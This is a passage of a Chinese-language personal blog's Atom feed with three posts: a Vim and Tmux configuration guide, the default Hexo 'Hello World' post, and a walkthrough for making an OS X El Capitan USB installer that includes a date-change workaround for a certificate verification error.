<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install pylint pep8</div></pre></td></tr></table></figure>
<p>安装好以后在.vimrc里面加上下面几行指定python的检查程序</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="string">"syntastic</span></div><div class="line">"<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">"</span></div><div class="line">set statusline+=%#warningmsg#</div><div class="line">set statusline+=%&#123;SyntasticStatuslineFlag()&#125;</div><div class="line">set statusline+=%*</div><div class="line">let g:syntastic_always_populate_loc_list = 1</div><div class="line">let g:syntastic_auto_loc_list = 1</div><div class="line">let g:syntastic_check_on_open = 0			"在打开文件时不自动检查</div><div class="line"><span class="built_in">let</span> g:syntastic_check_on_wq = 0				<span class="string">"在wq退出时不执行检查</span></div><div class="line">let g:syntastic_python_checkers=['pep8']  	"pylint检查的项多一些但是慢,这里看自己喜好了<span class="string">"</span></div><div class="line">"<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">"</span></div></pre></td></tr></table></figure>
<p>别的语言也是一样,如果你想添加php的支持,就把python换成php就好了,不过别忘了装需要的外部依赖</p>
<p>这样以后重启vim,打开一段python代码执行w命令保存的时候就会检查并提示报错了</p>
<p>给一张网上找的图</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643698821645.jpg" alt="20170603149643698821645.jpg"></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/2017060314964370082198.jpg" alt="2017060314964370082198.jpg"></p>
<p>Vim自动补全</p>
<p>代码检查也有了,下面就来配置一下最重要的代码补全,是要用到两个插件,YouCompleteMe,xptemplate.</p>
<p>我们先看YouCompleteMe,这可是个杀手级的插件啊,光看github上面的星星数就知道了</p>
<p>项目地址:<a href="https://github.com/Valloric/YouCompleteMe" target="_blank" rel="external">https://github.com/Valloric/YouCompleteMe</a></p>
<p>同样既然是vim的插件就先加上下面这行吧:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Plugin <span class="string">'Valloric/YouCompleteMe'</span></div></pre></td></tr></table></figure>
<p>等:PluginInstall完了以后,这个插件还不能用,这个是需要编译的. <strong>在编译之前先检查一下你的vim是不是7.4.143及其以上并且有python2或3支持</strong>,之后进入YouCompleteMe的目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> ~/.vim/bundle/YouCompleteMe</div></pre></td></tr></table></figure>
<p>然后执行install.py就可以编译了,这里还有几个选项需要注意一下</p>
<ul>
<li><code>--clang-completer</code>  对C-family的支持</li>
<li><code>--omnisharp-completer</code>  对C#的支持,需要安装Mono</li>
<li><code>--gocode-completer</code>  对Go的支持,需要安装Go</li>
<li><code>--tern-completer</code>  对js的支持,需要安装Node.js和npm</li>
<li><code>--racer-completer</code>  对Rust的支持</li>
</ul>
<p>或者你直接 <code>./install.py —all</code>  选中对所有语言的支持</p>
<p>编译需要一点时间,也很耗费资源,如果你机器配置太低的话,很有可能就直接卡死</p>
<p>编译好了以后,我们把下面的几行配置加入到.vimrc里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">let</span> g:ycm_autoclose_preview_window_after_completion=1</div><div class="line">map &lt;leader&gt;g  :YcmCompleter GoToDefinitionElseDeclaration&lt;CR&gt;</div><div class="line"><span class="built_in">let</span> g:ycm_global_ycm_extra_conf = <span class="string">'~/.vim/bundle/YouCompleteMe/third_party/ycmd/cpp/ycm/.ycm_extra_conf.py'</span></div><div class="line"><span class="built_in">let</span> g:ycm_confirm_extra_conf = 0</div></pre></td></tr></table></figure>
<p>好啦,重启vim你就可以拥有IDE般的自动补全了,注意上面第二行映射了一个键,在函数调用的地方按下<code>&lt;leader&gt;g</code>就可以跳转到函数定义的地方了(vim默认的\<leader\>是<code>\</code>,可以通过添加<code>let mapleader=</code>修改)</leader\></p>
<p>再来看一下xptemplate</p>
<p>xptemplate是可以补全各种结构的,比如你一个for,再按一下tab整个循环体就出来了,来一张官网上的图:</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643703294486.gif" alt="20170603149643703294486.gif"></p>
<p>这个插件安装非常简单,只需要添加上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Plugin <span class="string">'drmingdrmer/xptemplate'</span></div></pre></td></tr></table></figure>
<p>就可以了. 其实这个还支持自己定义的结构,这里就不多说了,自带的对我来说已经够用了,见<a href="https://github.com/drmingdrmer/xptemplate" target="_blank" rel="external">https://github.com/drmingdrmer/xptemplate</a></p>
<p>但是需要注意的是,用tab在各个代码块之间切换的时候有时候是会和上面的YouCompleteMe冲突的,为了解决这个问题,我添加了一条:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">"xptemplate</span></div><div class="line">"<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span></div><div class="line"><span class="built_in">let</span> g:xptemplate_nav_next = <span class="string">'&lt;C-I&gt;'</span></div><div class="line"><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">"</span></div></pre></td></tr></table></figure>
<p>用<code>Ctrl-i</code>来替代tab跳到下一个代码块,xptemplate有很多键都是可以改的,在项目地址里有很详细的介绍</p>
<p>代码注释</p>
<p>最后再让我们看一个代码注释的插件,代码注释/还原肯定是日常避免不了的,也是一件很麻烦的事情nerdcommenter可以帮我们省去不少的麻烦</p>
<p>安装同上:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Plugin <span class="string">'scrooloose/nerdcommenter'</span></div></pre></td></tr></table></figure>
<p>nerdcommenter支持很多种注释方式,最常用的<code>[count]&lt;leader&gt;c&lt;space&gt;</code> [count]是行数,\<leader\>默认是<code>\</code></leader\></p>
<p>比如我们在33行上键入<code>5\c空格</code> 33到38就被注释了,再重复一遍操作就取消注释了.  行数是可选的,直接选中内容<code>\c空格</code>也是一样的.</p>
<p>nerdcommenter有很多可选项,比如在注释符后面加空格啊之类的,详见:<a href="https://github.com/scrooloose/nerdcommenter" target="_blank" rel="external">https://github.com/scrooloose/nerdcommenter</a></p>
<h2 id="0x03-配置Tmux"><a href="#0x03-配置Tmux" class="headerlink" title="0x03 配置Tmux"></a>0x03 配置Tmux</h2><p>Tmux可以把你的terminal窗口分块,在多个会话间切换,效率瞬间提升,并且如果是在远端服务器上还不怕连接中断,回家吃个饭,attach一下接着干</p>
<p>首先安装:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install tmux</div></pre></td></tr></table></figure>
<p>tmux对我而言,最大的需求就是分屏分窗口和来回切换,其实tmux也有很多设置,也有自己的插件系统,但相比上面的Vim来说只需要简单设置就可以使用了</p>
<p>首先打开家目录下面的.tmux.conf(如果没有自己新建一个)</p>
<p>我们第一步先把先把\<prefix\>换成别的:(\<prefix\>就相当于vim里面的\<leader\>)</leader\></prefix\></prefix\></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> -g prefix C-q</div><div class="line">unbind C-b</div></pre></td></tr></table></figure>
<p>tmux的默认前缀是<code>Ctrl-b</code>不太方便,所以换成了<code>Ctrl-q</code>同时释放<code>Ctrl-b</code></p>
<p>这里之所以方便是因为我把键盘上<code>CapsLock</code>和<code>Ctrl</code>键换了位置</p>
<p>然后让我们看看怎么用吧</p>
<p>我们先按下<code>Ctrl-q</code>然后再按下<code>v</code>就会发现当前的窗口变成上下两半了,然后再按<code>Ctrl-q</code> <code>h</code>就又分成了左右两半</p>
<p>然后通过<code>Ctrl-q</code> <code>上下左右</code>就可以在不同的panel间移动了,是不是很有用呢,另外按下<code>Ctrl-q</code> <code>q</code>可以显示各个panel的编号,通过数字就可以直接切换过去了</p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643705731693.jpg" alt="20170603149643705731693.jpg"></p>
<p>然后再试一下<code>Ctrl-q</code> <code>c</code>就会新建一个窗口,通过<code>Ctrl-q</code> <code>n</code>或<code>p</code>来在不同的窗口间移动,有没有感觉比一个个开terminal窗口高效多了呢</p>
<p>根据个人喜好,在.tmux.conf里面加入下面几行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">bind</span> | split-window -h</div><div class="line"><span class="built_in">bind</span> - split-window -v</div><div class="line"></div><div class="line"><span class="built_in">bind</span> h select-pane -L</div><div class="line"><span class="built_in">bind</span> j select-pane -D</div><div class="line"><span class="built_in">bind</span> k select-pane -U</div><div class="line"><span class="built_in">bind</span> l select-pane -R</div></pre></td></tr></table></figure>
<p>这样我们把水平分屏和垂直分屏映射成了<code>|</code>和<code>-</code>,这样子一目了然是不是,然后把上下左右来控制的panel间移动改成了和vim一样的<code>hjkl</code>用起来就更顺手啦</p>
<p>然后我们给tmux加上鼠标支持,在.tmux.conf中加入以下几行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span> -g mouse on</div><div class="line"><span class="built_in">bind</span> -n WheelUpPane <span class="keyword">if</span>-shell -F -t = <span class="string">"#&#123;mouse_any_flag&#125;"</span> <span class="string">"send-keys -M"</span> <span class="string">"if -Ft= '#&#123;pane_in_mode&#125;' 'send-keys -M' 'select-pane -t=; copy-mode -e; send-keys -M'"</span></div><div class="line"><span class="built_in">bind</span> -n WheelDownPane select-pane -t= \; send-keys -M</div></pre></td></tr></table></figure>
<p>重启tmux以后就会发现用鼠标也可以点击选择panel了,也可以使用滑轮去翻动历史内容了 </p>
<p>然后和vim一样我们还是要解决tmux复制粘贴的问题</p>
<p>首先需要安装两样东西,一个是tmux-yank,一个是reattach-to-user-namespace</p>
<p>我们先来安装tmux-yank,先在家目录下面新建一个文件夹.tmux(别的也行),然后在.tmux目录下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/tmux-plugins/tmux-yank.git</div></pre></td></tr></table></figure>
<p>之后安装reattach-to-user-namespace</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">brew install reattach-to-user-namespace</div></pre></td></tr></table></figure>
<p>然后在.tmux.conf里添加</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">setw -g mode-keys vi</div><div class="line"><span class="built_in">bind</span> Escape copy-mode</div><div class="line">unbind p</div><div class="line"><span class="built_in">bind</span> p paste-buffer</div><div class="line"><span class="built_in">bind</span>-key -t vi-copy <span class="string">'v'</span> begin-selection</div><div class="line"><span class="built_in">bind</span>-key -t vi-copy <span class="string">'y'</span> copy-selection</div><div class="line"></div><div class="line"><span class="built_in">set</span> -g default-command <span class="string">"reattach-to-user-namespace -l zsh"</span></div><div class="line">run-shell ~/.tmux/tmux-yank/yank.tmux</div></pre></td></tr></table></figure>
<p>然后重启tmux,这时候按下<code>Ctrl-q</code> <code>[</code>就会发现,通过<code>hjkl</code>可以让光标在命令行窗口里的任意地方移动,和vim操作完全一样,然后按下<code>v</code>选择想要复制的内容再按下<code>y</code>就复制到系统剪贴板里面了</p>
<h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p>Tmux,Vim,zsh的配置远远不止这些,这里只介绍了一些简单的,也可以应付一般需求了. 更详细的配置可以查询手册,顺便推荐给大家两本书,关于vim和tmux的:</p>
<p>\<tmux-productive mouse-free="" development\=""></tmux-productive></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643709669861.jpg" alt="20170603149643709669861.jpg"></p>
<p>\<vim实用技巧\></vim实用技巧\></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/20170603149643712943978.jpg" alt="20170603149643712943978.jpg"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h1&gt;&lt;p&gt;新学期买了个新显示器专门用来放命令行,忙活了半天,集中解决了许多由来已久的小问题. 顺便总结一下&lt;/p&gt;
&lt;h2 id=&quot;0
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://klaus.link/2016/hello-world/"/>
    <id>http://klaus.link/2016/hello-world/</id>
    <published>2016-12-06T16:30:23.000Z</published>
    <updated>2016-12-06T16:46:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo new <span class="string">"My New Post"</span></div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo server</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo generate</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ hexo deploy</div></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>制作OS X启动U盘重装Mac操作系统</title>
    <link href="http://klaus.link/2016/USB_Install_OSX/"/>
    <id>http://klaus.link/2016/USB_Install_OSX/</id>
    <published>2016-10-16T15:26:23.000Z</published>
    <updated>2017-06-02T17:59:59.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>今天朋友的Mac出了点问题想重装系统, 然而把主分区抹了以后发现自己装不回去了…………  虽然我一直在用Mac,然而我的系统从来没有出现过问题,这也是自己第一次尝试, 中间还是有几个坑, 在网上左查右查还是费了不少劲, 在这里记录一下, 希望有人看到这篇文章可以少踩一些坑……</p>
<h2 id="0x01-遇到”This-item-is-temporarily-unavailable-”"><a href="#0x01-遇到”This-item-is-temporarily-unavailable-”" class="headerlink" title="0x01 遇到”This item is temporarily unavailable.”"></a>0x01 遇到”This item is temporarily unavailable.”</h2><p>好啦,首先当然就是重启电脑啦,然后开机的时候按住option键,开机的时候可以选择启动磁盘,选择那个Recovery 分区(这张图上没有),就可以进去恢复模式了,或者开机按住<strong>Command+R</strong> 也可以 (朋友Mac上主分区已经抹了所以开机直接就进到这里了)</p>
<p> <img src="http://ony7wielg.bkt.clouddn.com/20170531149617420597017.png" alt="20170531149617420597017.png"><img src="http://ony7wielg.bkt.clouddn.com/20170531149617424046344.png" alt="20170531149617424046344.png"></p>
<p>(图片来自Apple Support)</p>
<p>然后正常来讲点那个Reinstall选择磁盘,填上Apple ID就可以啦,一切都应该很顺利.</p>
<p>然而事实并非那么美好……..</p>
<p> <img src="http://ony7wielg.bkt.clouddn.com/20170531149617426179554.png" alt="20170531149617426179554.png"></p>
<p>(大概长这个样子,图片来自<a href="https://www.youtube.com/watch?v=WqBOZWeJaDM" target="_blank" rel="external">https://www.youtube.com/watch?v=WqBOZWeJaDM</a>)</p>
<p>首先就遇到了第一个问题<strong>“This item is temporarily unavailable. Please try again later”</strong>   填完Apple ID以后就弹出来个这个东东…看意思还以为自己网络不好,多次尝试,重启,依然是这样,于是上网搜之,基本有这么几种答案:</p>
<ol>
<li><p>你填写的Apple ID必须要是你注册这台机器的时候使用的ID,如果中间换ID了是不可以的,还是要填原来的才可以.    然而朋友的Mac用了好几年了,一开始那个ID怎么也想不起来了,遂作罢……</p>
</li>
<li><p>开机按住<strong>Option+Command+R</strong>进入网络恢复模式. 就可以不用上面那个Apple ID的验证了,然而这个网络安装的速度真是……每次都是百分之几就死掉了…..最后我认定在这种网络环境下不可能成功,作罢……</p>
</li>
<li><p>制作USB启动优盘来引导重装OS X,这个好,既可以解决Apple ID的麻烦,下载还快,并且还很想我们重装Windows/Linux的方法.</p>
<p>​</p>
</li>
</ol>
<h2 id="0x02-制作USB启动盘"><a href="#0x02-制作USB启动盘" class="headerlink" title="0x02 制作USB启动盘"></a>0x02 制作USB启动盘</h2><p>制作USB启动盘,当然得先有一块U盘啦~(<strong>注意 8GB或以上</strong>) </p>
<p>好啦,找一块U盘插到电脑上,打开Disk Utility按下图配置将U盘格式化</p>
<p> <img src="http://ony7wielg.bkt.clouddn.com/2017053114961743144415.png" alt="2017053114961743144415.png"></p>
<p>(图片来自<a href="http://www.jianshu.com/p/2ff576583361" target="_blank" rel="external">http://www.jianshu.com/p/2ff576583361</a>)</p>
<p>然后要去网上下载OS X的镜像啦~</p>
<blockquote>
<p><a href="http://dl.iplaysoft.com/files/3423.html" target="_blank" rel="external">http://dl.iplaysoft.com/files/3423.html</a>        OS X El Capitan(0dc524cc24d98b87195fb220588a7746)</p>
</blockquote>
<p>下载好了以后最好先校验一下MD5值看文件有没有丢失损坏</p>
<p>这个可以直接用mac自带的md5命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Klaus@Mac ~&gt; md5 /Users/klaus/Downloads/aa448e3591b4ff2a89abc4a124a26934.dmg</div><div class="line"></div><div class="line">MD5 (/Users/klaus/Downloads/aa448e3591b4ff2a89abc4a124a26934.dmg) = 0dc524cc24d98b87195fb220588a7746</div></pre></td></tr></table></figure>
<p>下载好了以后打开这个dmg把里面那个APP拖出来,放到随意一个地方,然后用下面的命令把安装程序烧录到U盘里面:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Klaus@Mac ~&gt; sudo /Applications/Install\ OS\ X\ El\ Capitan.app/Contents/Resources/createinstallmedia --volume /Volumes/Untitled --applicationpath /Applications/Install\ OS\ X\ El\ Capitan.app --nointeraction</div><div class="line"></div><div class="line">Erasing Disk: 0%... 10%... 20%... 30%...100%...</div><div class="line">Copying installer files to disk...</div><div class="line">Copy complete.</div><div class="line">Making disk bootable...</div><div class="line">Copying boot files...</div><div class="line">Copy complete.</div><div class="line">Done.</div></pre></td></tr></table></figure>
<p>我是拖到Application里了,Install OS X El Capitan.app是安装包,/Volumes/Untitled是你想要烧的U盘的路径,如果你路径不一样或者改名了,一定要记着改过来. 然后就等着出现下面的Done,这时启动U盘就制作好啦.</p>
<p>制作引导安装器的命令可参考:</p>
<blockquote>
<p><a href="https://support.apple.com/zh-cn/HT201372" target="_blank" rel="external">https://support.apple.com/zh-cn/HT201372</a></p>
</blockquote>
<h2 id="0x03-从U盘引导安装OS-X-El-Capitan"><a href="#0x03-从U盘引导安装OS-X-El-Capitan" class="headerlink" title="0x03 从U盘引导安装OS X El Capitan"></a>0x03 从U盘引导安装OS X El Capitan</h2><p>然后把优盘插在你要恢复的电脑上按住Option键重启,选择从U盘启动</p>
<p> <img src="http://ony7wielg.bkt.clouddn.com/20170531149617433654794.png" alt="20170531149617433654794.png">)</p>
<p>(图片来自<a href="http://www.jianshu.com/p/2ff576583361" target="_blank" rel="external">http://www.jianshu.com/p/2ff576583361</a>)</p>
<p>如果你下载的镜像没有问题的话点击去就可以安装啦 <img src="http://ony7wielg.bkt.clouddn.com/20170531149617436624094.png" alt="20170531149617436624094.png"></p>
<p>(图片来自<a href="http://www.jianshu.com/p/2ff576583361" target="_blank" rel="external">http://www.jianshu.com/p/2ff576583361</a>)</p>
<p>然而……….事实不是这样的…….你还会遇到 <strong>“This copy of the Install OS X El Capitan application can’t be verified. It may have been corrupted or tampered with during downloading”</strong></p>
<p><img src="http://ony7wielg.bkt.clouddn.com/201705311496174399554.png" alt="201705311496174399554.png"></p>
<p>(图片来自<a href="http://apple.stackexchange.com/questions/216730/this-copy-of-the-install-os-x-el-capitan-application-cant-be-verified-it-may-h" target="_blank" rel="external">http://apple.stackexchange.com/questions/216730/this-copy-of-the-install-os-x-el-capitan-application-cant-be-verified-it-may-h</a>)</p>
<p>乍一看还以为自己的下载的镜像或者烧录的时候出了问题,再网上一搜才知道是这么回事:</p>
<p>我们需要把电脑上的日期往后调一点才能正常地安装,调整到大概你安装OS X El Capitan的时候(或者是之前我想)</p>
<blockquote>
<p>参考 <a href="http://apple.stackexchange.com/questions/216730/this-copy-of-the-install-os-x-el-capitan-application-cant-be-verified-it-may-h" target="_blank" rel="external">http://apple.stackexchange.com/questions/216730/this-copy-of-the-install-os-x-el-capitan-application-cant-be-verified-it-may-h</a></p>
<p><a href="http://apple.stackexchange.com/users/174296/kimbaudi" target="_blank" rel="external">kimbaudi</a>@stackexchange</p>
<p>I think many people think setting the date to the current date automatically fixes the issue, but this is not the case. You have to remember the date you installed “El Capitan OS X installer.app” into your Application folder. For me, it was around Sept 2015. Right now is March 2016. When I got this error while reinstalling El Capitan OS X, I set the date to today’s date (i.e. date 03061225616) and it did not work because I installed “El Capitan OS X installer.app” around Sept 2015 and the digital signature/certificates for my installer had expired by now. Once I reset the date to Sept 2015 (i.e. date 0923020415), the installation worked without a problem.</p>
<p>If you can neither remember nor correctly guess the date you installed “El Capitan OS X installer.app” into your Application folder, then you would have to delete it and reinstall it into your Applications folder so that the digital signature/certficates for the installer is no longer expired.</p>
<p>Also, setting the date manually in the terminal (i.e. date MMDDhhmmYY) worked for me. I heard setting the date automatically in the terminal (i.e. ntpdate -u time.apple.com) works for some people, but not for me. It most likely worked for them because they recently installed/reinstalled “El Capitan OS X installer.app” into their Application folder</p>
</blockquote>
<p>具体操作就是关掉现在出错的这个窗口在你的Recovery Utilities中是可以打开Terminal的键入命令(找不到看下面视频):</p>
<p><code>Date 0328015315</code></p>
<p>就可以啦</p>
<blockquote>
<p>参考<a href="https://www.youtube.com/watch?v=LRPiynS15_U(有个视频" target="_blank" rel="external">https://www.youtube.com/watch?v=LRPiynS15_U(有个视频</a>)</p>
<p><a href="https://www.youtube.com/channel/UCm1G-I81061vLmwSCTBzq3w" target="_blank" rel="external">Easy Steps</a>@Youtube</p>
<p>How to fix OS X application can’t be verified | OS X El Capitan | macOS Sierra | Yosemite Corrupted or Damaged during Downloading in Easy Steps.<br>“ This copy of the install OS X Yosemite (any OS X) application can’t be verified. It may have been corrupted or tampered with during downloading”<br>(USE THE SAME DATE “below” FOR OLDER INSTALLER OS X)<br>Try the same date for older version, as shown below and it will work. (once it’s installed then changed to current date)<br>For El Capitan and macOS Sierra change it to current date.<br>Terminal command: (example)<br>Date 0328015315<br>(monthdatetimeyear) String of numbers = month 03, date 28, time 0153, and year 15, combined.</p>
<p>************************************************************************************</p>
<p>IF IT STILL FAIL, THEN TRY TO CHANGE THE DATE BACK TO “January 01 2016 or 0101(current time)(current year)”<br>“010100002016”</p>
<p>************************************************************************************</p>
</blockquote>
<p>改好日期,就真的可以装啦~(至少我是) 然后装好系统别忘把日期改回来,不然以后升级的时候又会遇到问题</p>
<h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="http://www.iplaysoft.com/osx-yosemite-usb-install-drive.html" target="_blank" rel="external">http://www.iplaysoft.com/osx-yosemite-usb-install-drive.html</a></p>
<p><a href="https://www.youtube.com/watch?v=LRPiynS15_U" target="_blank" rel="external">https://www.youtube.com/watch?v=LRPiynS15_U</a></p>
<p><a href="http://apple.stackexchange.com/questions/216730/this-copy-of-the-install-os-x-el-capitan-application-cant-be-verified-it-may-h" target="_blank" rel="external">http://apple.stackexchange.com/questions/216730/this-copy-of-the-install-os-x-el-capitan-application-cant-be-verified-it-may-h</a></p>
<p><a href="https://support.apple.com/zh-cn/HT201372" target="_blank" rel="external">https://support.apple.com/zh-cn/HT201372</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00&quot;&gt;&lt;a href=&quot;#0x00&quot; class=&quot;headerlink&quot; title=&quot;0x00&quot;&gt;&lt;/a&gt;0x00&lt;/h2&gt;&lt;p&gt;今天朋友的Mac出了点问题想重装系统, 然而把主分区抹了以后发现自己装不回去了…………  虽然我一直在用Mac,然而我的系统
    
    </summary>
    
    
  </entry>
  
</feed>
